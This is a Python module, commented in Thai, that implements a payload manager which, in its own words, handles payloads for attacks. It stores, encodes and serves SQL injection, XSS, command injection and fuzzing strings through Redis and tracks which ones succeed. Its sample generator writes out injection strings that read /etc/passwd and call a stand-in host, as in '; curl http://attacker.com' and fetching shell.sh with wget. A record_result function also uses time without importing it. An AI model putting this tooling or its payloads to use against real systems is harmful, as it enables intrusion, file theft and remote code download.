"""
Payload Manager - จัดการ Payloads สำหรับการโจมตี

รองรับการโหลด, จัดเก็บ, และดึง Payloads หลายประเภท:
- SQL Injection
- XSS
- RCE/Command Injection
- Fuzzing Payloads
- Steganography Payloads
"""

import json
import random
import os
import base64
import re
from typing import List, Dict, Optional
from pathlib import Path


class PayloadManager:
    """จัดการ Payloads สำหรับการโจมตี"""
    
    PAYLOAD_TYPES = [
        'sqli',
        'xss',
        'rce',
        'fuzzing',
        'stego'
    ]
    
    def __init__(self, redis_manager, payloads_dir='payloads'):
        """
        Initialize PayloadManager
        
        Args:
            redis_manager: RedisManager instance สำหรับ caching
            payloads_dir: ไดเรกทอรีที่เก็บไฟล์ payloads
        """
        self.redis = redis_manager
        # Compatibility for MockRedisManager which might not have a .db attribute directly
        self._db = getattr(redis_manager, 'db', redis_manager)
        self.payloads_dir = Path(payloads_dir)
        self.payload_cache = {}
        self.stats = {
            'loaded': 0,
            'used': 0,
            'success': 0,
            'failed': 0
        }
        
        # สร้างไดเรกทอรีถ้ายังไม่มี
        self.payloads_dir.mkdir(exist_ok=True)
        for payload_type in self.PAYLOAD_TYPES:
            (self.payloads_dir / payload_type).mkdir(exist_ok=True)
    
    def load_payloads(self, payload_type: str, filename: str = None) -> int:
        """
        โหลด payloads จากไฟล์และเก็บใน Redis
        
        Args:
            payload_type: ประเภทของ payload (sqli, xss, rce, fuzzing, stego)
            filename: ชื่อไฟล์ (ถ้าไม่ระบุจะใช้ default)
        
        Returns:
            จำนวน payloads ที่โหลดได้
        """
        if payload_type not in self.PAYLOAD_TYPES:
            raise ValueError(f"Invalid payload type: {payload_type}")
        
        if filename is None:
            filename = f"{payload_type}_payloads.txt"
        
        filepath = self.payloads_dir / payload_type / filename
        
        if not filepath.exists():
            print(f"[PayloadManager] Warning: Payload file not found: {filepath}")
            return 0
        
        payloads = []
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    payloads.append(line)
        
        # เก็บใน Redis
        redis_key = f"PAYLOADS:{payload_type.upper()}"
        self._db.delete(redis_key)
        
        if payloads:
            self._db.rpush(redis_key, *payloads)
            self.payload_cache[payload_type] = payloads
            self.stats['loaded'] += len(payloads)
            print(f"[PayloadManager] Loaded {len(payloads)} {payload_type} payloads")
        
        return len(payloads)
    
    def load_all_payloads(self) -> Dict[str, int]:
        """
        โหลด payloads ทุกประเภท
        
        Returns:
            Dictionary ที่แสดงจำนวน payloads แต่ละประเภท
        """
        results = {}
        for payload_type in self.PAYLOAD_TYPES:
            count = self.load_payloads(payload_type)
            results[payload_type] = count
        
        return results
    
    def get_payload(self, payload_type: str, encoding: str = None, 
                    random_selection: bool = True) -> Optional[str]:
        """
        ดึง payload แบบสุ่มหรือตามลำดับ
        
        Args:
            payload_type: ประเภทของ payload
            encoding: การ encode (base64, url, html, hex, none)
            random_selection: ถ้า True จะสุ่ม, False จะเอาตามลำดับ
        
        Returns:
            Payload string หรือ None ถ้าไม่มี
        """
        if payload_type not in self.PAYLOAD_TYPES:
            raise ValueError(f"Invalid payload type: {payload_type}")
        
        redis_key = f"PAYLOADS:{payload_type.upper()}"
        
        # Prevent error on empty list
        if self._db.llen(redis_key) == 0:
            return None

        # ดึงจาก Redis
        if random_selection:
            # MockRedis might not support all commands, but this logic is safer
            if hasattr(self._db, 'srandmember') and self._db.type(redis_key) == b'set':
                 payload = self._db.srandmember(redis_key)
            else:
                 payload = self._db.lindex(redis_key, random.randint(0, self._db.llen(redis_key) - 1))
        else:
            payload = self._db.lpop(redis_key)
            if payload:
                self._db.rpush(redis_key, payload)  # ใส่กลับไปท้ายคิว
        
        if not payload:
            return None
        
        # Decode ถ้าเป็น bytes
        if isinstance(payload, bytes):
            payload = payload.decode('utf-8')
        
        # Apply encoding
        if encoding:
            payload = self._encode_payload(payload, encoding)
        
        self.stats['used'] += 1
        return payload
    
    def get_batch_payloads(self, payload_type: str, count: int, 
                          encoding: str = None) -> List[str]:
        """
        ดึง payloads หลายรายการพร้อมกัน
        
        Args:
            payload_type: ประเภทของ payload
            count: จำนวนที่ต้องการ
            encoding: การ encode
        
        Returns:
            List ของ payloads
        """
        payloads = []
        for _ in range(count):
            payload = self.get_payload(payload_type, encoding)
            if payload:
                payloads.append(payload)
        
        return payloads
    
    def validate_payload(self, payload: str, payload_type: str) -> bool:
        """
        ตรวจสอบความถูกต้องของ payload
        
        Args:
            payload: Payload string
            payload_type: ประเภทของ payload
        
        Returns:
            True ถ้า valid, False ถ้าไม่
        """
        if not payload or not isinstance(payload, str):
            return False
        
        # Use more robust regex for validation
        if payload_type == 'sqli':
            # Looks for common SQL injection patterns
            return bool(re.search(r"(\s(OR|AND|UNION)\s|'|--|/\*|\*\/)", payload, re.IGNORECASE))
        
        elif payload_type == 'xss':
            # Looks for script tags, event handlers, or javascript protocol
            return bool(re.search(r"(<script|onerror|onload|javascript:)", payload, re.IGNORECASE))
        
        elif payload_type == 'rce':
            # Looks for shell command separators or execution syntax
            return bool(re.search(r"[;&|`$()]", payload))
        
        elif payload_type == 'fuzzing':
            return len(payload) > 0
        
        elif payload_type == 'stego':
            try:
                base64.b64decode(payload)
                return True
            except:
                return len(payload) > 0
        
        return True
    
    def _encode_payload(self, payload: str, encoding: str) -> str:
        """
        Encode payload ตามที่กำหนด
        
        Args:
            payload: Payload string
            encoding: ประเภทการ encode
        
        Returns:
            Encoded payload
        """
        if encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        
        elif encoding == 'url':
            import urllib.parse
            return urllib.parse.quote(payload)
        
        elif encoding == 'html':
            import html
            return html.escape(payload)
        
        elif encoding == 'hex':
            return payload.encode().hex()
        
        elif encoding == 'none' or encoding is None:
            return payload
        
        else:
            raise ValueError(f"Unknown encoding: {encoding}")
    
    def record_result(self, payload: str, payload_type: str, 
                     success: bool, details: str = None):
        """
        บันทึกผลการใช้ payload
        
        Args:
            payload: Payload ที่ใช้
            payload_type: ประเภท
            success: สำเร็จหรือไม่
            details: รายละเอียดเพิ่มเติม
        """
        result = {
            'payload': payload[:100],  # เก็บแค่ 100 ตัวอักษรแรก
            'type': payload_type,
            'success': success,
            'details': details,
            'timestamp': self._db.time()[0] if hasattr(self._db, 'time') else int(time.time())
        }
        
        # บันทึกใน Redis
        redis_key = f"PAYLOAD_RESULTS:{payload_type.upper()}"
        self._db.lpush(redis_key, json.dumps(result))
        self._db.ltrim(redis_key, 0, 999)  # เก็บแค่ 1000 รายการล่าสุด
        
        # Update stats
        if success:
            self.stats['success'] += 1
        else:
            self.stats['failed'] += 1
    
    def get_stats(self) -> Dict:
        """
        ดึงสถิติการใช้งาน
        
        Returns:
            Dictionary ของสถิติ
        """
        stats = self.stats.copy()
        
        # เพิ่มข้อมูลจำนวน payloads ใน Redis
        for payload_type in self.PAYLOAD_TYPES:
            redis_key = f"PAYLOADS:{payload_type.upper()}"
            count = self._db.llen(redis_key)
            stats[f'{payload_type}_count'] = count
        
        return stats
    
    def generate_sample_payloads(self, payload_type: str, count: int = 100):
        """
        สร้าง sample payloads สำหรับทดสอบ
        
        Args:
            payload_type: ประเภทของ payload
            count: จำนวนที่ต้องการสร้าง
        """
        payloads = []
        
        if payload_type == 'sqli':
            templates = [
                "' OR 1=1--",
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "' AND 1=1--",
                "admin'--",
                "' OR 'x'='x",
                "1' ORDER BY {}--",
                "' UNION SELECT {},{}--"
            ]
            for i in range(count):
                template = random.choice(templates)
                if '{}' in template:
                    payload = template.format(random.randint(1, 10), random.randint(1, 10))
                else:
                    payload = template
                payloads.append(payload)
        
        elif payload_type == 'xss':
            templates = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<input onfocus=alert(1) autofocus>"
            ]
            for i in range(count):
                payloads.append(random.choice(templates))
        
        elif payload_type == 'rce':
            templates = [
                "; ls -la",
                "&& whoami",
                "| cat /etc/passwd",
                "`id`",
                "$(whoami)",
                "; curl http://attacker.com",
                "&& wget http://attacker.com/shell.sh"
            ]
            for i in range(count):
                payloads.append(random.choice(templates))
        
        elif payload_type == 'fuzzing':
            # สร้าง fuzzing payloads แบบต่างๆ
            for i in range(count):
                fuzz_type = random.choice(['overflow', 'format', 'integer', 'special'])
                if fuzz_type == 'overflow':
                    payloads.append('A' * random.randint(100, 10000))
                elif fuzz_type == 'format':
                    payloads.append('%s' * random.randint(10, 100))
                elif fuzz_type == 'integer':
                    payloads.append(str(2**random.randint(16, 64)))
                else:
                    payloads.append(''.join(chr(random.randint(0, 255)) for _ in range(50)))
        
        # บันทึกลงไฟล์
        # Corrected filename to match what load_payloads expects
        filepath = self.payloads_dir / payload_type / f"{payload_type}_payloads.txt"
        with open(filepath, 'w', encoding='utf-8') as f:
            for payload in payloads:
                f.write(f"{payload}\n")
        
        print(f"[PayloadManager] Generated {count} sample {payload_type} payloads to {filepath}")
        return filepath


# Example usage
if __name__ == "__main__":
    from data_hub.redis_manager import RedisManager
    from config import REDIS_CONFIG
    
    # Initialize
    redis_manager = RedisManager(REDIS_CONFIG)
    payload_manager = PayloadManager(redis_manager)
    
    # Generate sample payloads
    for ptype in PayloadManager.PAYLOAD_TYPES[:4]:  # ไม่รวม stego
        payload_manager.generate_sample_payloads(ptype, 100)
    
    # Load payloads
    results = payload_manager.load_all_payloads()
    print(f"Loaded payloads: {results}")
    
    # Get some payloads
    sqli_payload = payload_manager.get_payload('sqli', encoding='url')
    print(f"SQLi payload: {sqli_payload}")
    
    # Get stats
    stats = payload_manager.get_stats()
    print(f"Stats: {stats}")
